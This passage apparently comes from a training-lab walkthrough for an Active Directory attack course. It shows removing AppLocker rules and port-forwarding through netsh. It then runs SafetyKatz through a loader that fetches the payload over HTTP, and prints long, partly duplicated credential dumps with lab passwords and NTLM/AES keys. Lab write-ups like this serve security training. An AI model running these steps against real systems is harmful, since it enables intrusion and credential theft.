gpmc.msc
```



<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

In the new window, Expand Policies -> Windows Settings -> Security Settings -> Application Control Policies -> Applocker and Edit it

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Delete the exactuable rule

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Now, we can either wait for the Group Policy refresh or force an update on the dcorp-adminsrv machine. Let's go for the later using the following commands as studentx:

```powershell
winrs -r:dcorp-adminsrv cmd
gpupdate /force
```

Now, let's copy Loader on the machine, add portfowarding:

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
```

```powershell
winrs -r:dcorp-adminsrv cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67
```

and execute SafetyKatz

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

```powershell
Authentication Id : 0 ; 11523662 (00000000:00afd64e)
Session           : NewCredentials from 0
User Name         : student867
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 5/9/2025 2:00:54 PM
SID               : S-1-5-21-719815819-3726368948-3917688648-20607

         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
         * Key List :
           aes256_hmac       01e519027474feb980e17dadb7230f81ccc3114a49f964732e0c225f91de91a6
           aes128_hmac       1078167b969a70401927d9fb1faf4e10
           rc4_hmac_nt       31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_old      31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_md4           31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_nt_exp   31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_old_exp  31d6cfe0d16ae931b73c59d7e0c089c0

Authentication Id : 0 ; 5853380 (00000000:005950c4)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/11/2025 4:22:58 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1115

         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728
           rc4_md4           a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728

Authentication Id : 0 ; 138873 (00000000:00021e79)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:48 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114

         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
         * Key List :
           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
           aes128_hmac       86a353c1ea16a87c39e2996253211e41
           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f
           rc4_md4           cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:35 AM
SID               : S-1-5-20
Authentication Id : 0 ; 11523662 (00000000:00afd64e)
Session           : NewCredentials from 0
User Name         : student867
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 5/9/2025 2:00:54 PM
SID               : S-1-5-21-719815819-3726368948-3917688648-20607

         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
         * Key List :
           aes256_hmac       01e519027474feb980e17dadb7230f81ccc3114a49f964732e0c225f91de91a6
           aes128_hmac       1078167b969a70401927d9fb1faf4e10
           rc4_hmac_nt       31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_old      31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_md4           31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_nt_exp   31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_old_exp  31d6cfe0d16ae931b73c59d7e0c089c0

Authentication Id : 0 ; 5853380 (00000000:005950c4)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/11/2025 4:22:58 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1115

         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728
           rc4_md4           a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728

Authentication Id : 0 ; 138873 (00000000:00021e79)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:48 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114

         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
         * Key List :
           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
           aes128_hmac       86a353c1ea16a87c39e2996253211e41
           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f
           rc4_md4           cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:35 AM
SID               : S-1-5-20
         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 11527478 (00000000:00afe536)
Session           : NewCredentials from 0
User Name         : student867
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 5/9/2025 2:01:05 PM
SID               : S-1-5-21-719815819-3726368948-3917688648-20607

         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
         * Key List :
           aes256_hmac       01e519027474feb980e17dadb7230f81ccc3114a49f964732e0c225f91de91a6
           aes128_hmac       1078167b969a70401927d9fb1faf4e10
           rc4_hmac_nt       31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_old      31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_md4           31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_nt_exp   31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_old_exp  31d6cfe0d16ae931b73c59d7e0c089c0

Authentication Id : 0 ; 5835552 (00000000:00590b20)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/11/2025 4:22:36 AM
SID               : S-1-5-96-0-2
         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
         * Key List :
           aes256_hmac       01e519027474feb980e17dadb7230f81ccc3114a49f964732e0c225f91de91a6
           aes128_hmac       1078167b969a70401927d9fb1faf4e10
           rc4_hmac_nt       31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_old      31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_md4           31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_nt_exp   31d6cfe0d16ae931b73c59d7e0c089c0
           rc4_hmac_old_exp  31d6cfe0d16ae931b73c59d7e0c089c0

Authentication Id : 0 ; 5835552 (00000000:00590b20)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/11/2025 4:22:36 AM
SID               : S-1-5-96-0-2

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 138848 (00000000:00021e60)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:48 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117

         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
         * Key List :
           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
           rc4_md4           d549831a955fee51a43c83efb3928fa7
           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7
           Authentication Id : 0 ; 22574 (00000000:0000582e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:35 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 22546 (00000000:00005812)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:35 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:34 AM
SID               : S-1-5-18

         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565           
```

And now we're able to disable Applocker.

### Flag 10 \[dcorp-mgmt] - Process using svcadmin as service account 🚩

Remembering that we already know credentials for svcadmin user using Safetykatz: `winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"`

we can start a session inserting credentials below:

```powershell
Authentication Id : 0 ; 86511 (00000000:000151ef)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:52 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8
```

```powershell
Enter-PSSession -ComputerName dcorp-mgmt -Credential (Get-Credential)
```

and discover the process associated to svcadmin user:

```powershell
Get-Process -IncludeUserName | Where-Object { $_.UserName -match "svcadmin" }
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Flag 11 \[dcorp-mgmt] - NTLM hash of svcadmin account 🚩

As the last point, based on the SafetyKatz output we can see the svcadmin's ntlm hash (rc4\_hmac\_nt)

```powershell
Authentication Id : 0 ; 86511 (00000000:000151ef)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:52 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8
```

### Flag 12 \[dcorp-adminsrv] - We tried to extract clear-text credentials for scheduled tasks from? Flag value is like lsass, registry, credential vault etc 🚩

Remembering that we already know credentials for svcadmin user using Safetykatz, we can start a session as adminsrv

```powershell
Enter-PSSession -ComputerName dcorp-adminsrv
```

and trying to execute: `vault::cred` and `vault::list` , we discover that the answer is regards credential vault.

### Flag 13 \[dcorp-adminsrv] - NTLM hash of srvadmin extracted from dcorp-adminsrv 🚩

We already know credentials exacted using Safetykatz: `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`

```powershell
Authentication Id : 0 ; 5853380 (00000000:005950c4)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/11/2025 4:22:58 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1115

         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728
           rc4_md4           a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728
```

### Flag 14 \[dcorp-adminsrv] - NTLM hash of websvc extracted from dcorp-adminsrv 🚩

Here below the websvc's ntlm hash:

```powershell
Authentication Id : 0 ; 138873 (00000000:00021e79)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:48 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114

         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
         * Key List :
           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
           aes128_hmac       86a353c1ea16a87c39e2996253211e41
           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f
           rc4_md4           cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f
```

### Flag 15 \[dcorp-adminsrv] - NTLM hash of appadmin extracted from dcorp-adminsrv 🚩

Here below the appadmin's ntlm hash:

```powershell
Authentication Id : 0 ; 138848 (00000000:00021e60)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:48 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117

         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
         * Key List :
           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
           rc4_md4           d549831a955fee51a43c83efb3928fa7
           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7
           Authentication Id : 0 ; 22574 (00000000:0000582e)
```
